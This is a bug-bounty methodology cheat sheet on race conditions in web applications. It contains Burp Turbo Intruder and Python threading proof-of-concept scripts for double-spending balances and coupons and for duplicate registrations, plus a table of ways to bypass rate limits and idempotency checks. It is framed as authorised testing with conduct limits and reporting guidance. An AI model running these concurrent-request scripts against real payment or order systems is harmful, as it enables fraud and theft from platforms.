# Race Conditions

> Perspective: black-box, the goal is to use concurrency to make "check-then-act" fail

## 1. One-line Summary

Race condition = the program assumes "read → modify → write" is atomic, but concurrent requests make it not so.
SRC value: coupon / balance / purchase-limit double-spend = P1 ($500–$5k); can be amplified in financial scenarios.

---

## 2. Typical Scenarios

| Scenario | Description |
|------|------|
| Balance over-deduction | 100 units of balance, concurrent withdrawals of 100, withdrawn N times |
| Coupon double-spend | A one-time-use coupon used N times concurrently |
| Purchase-limit rush | A 1-item limit bought as N items concurrently |
| Invitation reward | Inviting the same user multiple times to get multiple rewards |
| CAPTCHA reuse | A code consumed once, but used multiple times concurrently |
| Unique constraint broken | Registering same-name account / same email |
| State machine jump | The same order "cancelled" and "shipped" at the same time |
| File upload | Upload + validate + store not atomic |

---

## 3. Probing Techniques

### 3.1 Tools

```
- Burp Suite Intruder: choose attack type "Pitchfork", set "Send N requests in parallel"
- Burp Turbo Intruder (more precise concurrency):
    requestEngine.queue(req, gate='race1')
    then openGate('race1')
- HTTPie concurrency: xargs -P 50
- Self-written Python: threading + requests
- Go: goroutine + http.Client
```

### 3.2 Burp Turbo Intruder Template

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=30,
                            requestsPerConnection=100,
                            engine=Engine.BURP2)
    for i in range(50):
        engine.queue(target.req, gate='r1')
    engine.openGate('r1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Classic PoC: Balance Withdrawal

```python
import threading, requests

def withdraw():
    requests.post("https://target/api/withdraw",
                  json={"amount":100},
                  headers={"Authorization":"Bearer X"})

# Account balance 100, concurrently withdraw 100 fifty times
threads = [threading.Thread(target=withdraw) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# Check backend balance
r = requests.get("https://target/api/balance", ...)
print(r.json())  # balance may become -4900 / multiple successful withdrawals
```

### 3.4 Classic PoC: Coupon Double-Spend

```python
def use_coupon():
    requests.post("https://target/api/order/create",
                  json={"productId":"X","couponCode":"SAVE50"},
                  headers={"Authorization":"Bearer X"})

threads = [threading.Thread(target=use_coupon) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]

# Server side: 1 coupon should only be usable once, but concurrency may create 5 discounted orders
```

### 3.5 Unique Constraint Breaking

```python
def register():
    requests.post("https://target/api/register",
                  json={"email":"hunter+race@test.com","username":"raceX","password":"x"})

threads = [threading.Thread(target=register) for _ in range(20)]
# If the schema has no unique constraint + check-then-create, multiple accounts may be created
```

---

## 4. Bypass Matrix

| Block | Bypass |
|---|---|
| Single-connection rate limit | Multiple connections / HTTP/2 multiplexing |
| Same-IP rate limit | Multiple IPs / proxy pool |
| Idempotency-Key | Try without it / try a different key but same business operation |
| Database unique constraint | Case difference: `Hunter@x` vs `hunter@x` |
| One-time token | Concurrent requests while the token is not yet marked "used" |

---

## 5. Exploitation / Privilege Escalation / Lateral Movement

```
Balance over-deduction → actual withdrawal of real money
Coupon / gift card double-spend → multiplied goods
Purchase-limit rush → scalping
Unique constraint breaking → register admin same-name account
State machine jump → cancelled order still shipped
```

---

## 6. Real Cases

- Starbucks gift card race: $1000 balance turned into $6000
- Multiple financial-platform race reports on HackerOne
- Coupon double-spend on a domestic food-delivery platform

---

## 7. Reproduction / Evidence Essentials

### 7.1 Report Must-Haves

1. Attack script (Python / Burp Turbo)
2. Screenshots of account state before and after the attack (balance, coupon count)
3. Reproduction rate: at least N successes out of 5–10 attacks
4. Impact estimate

### 7.2 PoC Template

```
# Before attack
GET /api/balance → {"balance":"100.00"}

# Concurrent attack (script in attached attack.py)
$ python3 attack.py
sent 50 concurrent withdraw(100) requests

# After attack
GET /api/balance → {"balance":"-4500.00"}
GET /api/transactions → 5 successful withdrawals of 100, each with status SUCCESS

# Reproduction
5 rounds total, 50 concurrent each, average 4 successes/round (double-spend probability 80%)
```

### 7.3 CVSS

```
Balance over-deduction (financial)   = 7.5–9.1
Coupon double-spend                  = 6.5–7.5
Purchase-limit bypass                = 5.3–6.5
Unique constraint break → privesc    = 8.1
```

### 7.4 Impact Section

```
Through the concurrent withdrawal endpoint /api/withdraw, an attacker can make the account balance go negative (i.e. "withdraw money out of thin air").
Out of 50 concurrent requests there are typically 4–5 successful deductions, each 100 units, with an initial account balance of 100 units.
Economic model: 1 unit of cost (initial balance) → 4–5x withdrawal.
During testing, the researcher used their own account and immediately coordinated with the platform's risk-control team to return all "over-deducted" funds.
```

---

## 8. What Not To Do

- **Forbidden**: actually withdrawing real money. Operate in a test environment / sandbox / a demo account the platform allows. If it can only be done in production, **proactively contact the platform** to explain you will perform concurrency testing, and agree on a refund mechanism.
- **Forbidden**: using concurrency to farm other people's coupons / invitation rewards.
- **Limit**: concurrency within 50, do not use 1000+ (treated as DoS).
- **Limit**: reproduce the same vulnerability 5–10 times, do not run it thousands of times.
- **In the report**: attach detailed "before / during / after" data for each experiment to prove you stopped.

## H1 Real Cases

_A total of 5 publicly disclosed HackerOne High/Critical reports match this category, sorted by (bounty + votes×100) and taking the Top 12_

| Severity | $ | Program | Title (click for original report) | Summary |
|---|--:|---|---|---|
| Critical | 15250 usd | Shopify | [Ability to bypass partner email confirmation to take over any store given an employee email](https://hackerone.com/reports/300305) | I told Pete I would take a look at Spotify, hi Pete. Summary** It's possible to take over any store account through partners gi… |
| High | 3000 usd | Tools for Humanity | [Race Condition Enables Bypassing Verification Check](https://hackerone.com/reports/2110030) | Race Condition Enables Bypassing Verification Check |
| Critical | 5000 usd | Cosmos | [Race condition in faucet when using starport](https://hackerone.com/reports/1438052) | Hi team, I and Aditya sent this bug over email on Wed, 29 Dec, 17:45 IST |
| High | 4000 usd | Internet Bug Bounty | [Time-of-check to time-of-use vulnerability in the std::fs::remove_dir_all() function of the Rust …](https://hackerone.com/reports/1520931) | The implementation of `std::fs::remove_dir_all()` in the Rust standard library is vulnerable to a time-of-check to time-of-use … |
| High | — | curl | [TOCTOU Race Condition in HTTP/2 Connection Reuse Leads to Certificate Validation Bypass](https://hackerone.com/reports/3335085) | I've discovered a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in how `libcurl` handles persistent HTTP/2 connections |

**Weakness distribution matching this category:**

- Time-of-check Time-of-use (TOCTOU) Race Condition: 3 entries
- Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'): 1 entry
- Uncategorized → manually categorized: 1 entry
